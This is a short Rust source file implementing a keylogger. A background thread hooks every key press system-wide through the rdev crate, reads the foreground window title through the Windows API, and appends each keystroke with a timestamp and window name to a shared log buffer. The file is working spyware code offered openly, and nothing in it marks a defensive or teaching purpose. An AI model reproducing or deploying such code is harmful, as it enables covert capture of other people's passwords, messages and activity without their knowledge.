use chrono;
use rdev::{listen, Event, EventType};
use std::sync::{Arc, Mutex};
use std::thread;

fn get_window_title() -> String {
    use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowTextW};
    unsafe {
        let hwnd = GetForegroundWindow();
        let mut buffer: [u16; 256] = [0; 256];
        let len = GetWindowTextW(hwnd, &mut buffer);
        String::from_utf16_lossy(&buffer[..len as usize])
    }
}

pub fn start_keylogger(keylog: Arc<Mutex<String>>) {
    thread::spawn(move || {
        let callback = move |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                let window = get_window_title();
                let mut log = keylog.lock().unwrap();
                log.push_str(&format!("[{}] [{}] {:?}\n", chrono::Utc::now(), window, key));
            }
        };
        let _ = listen(callback);
    });
}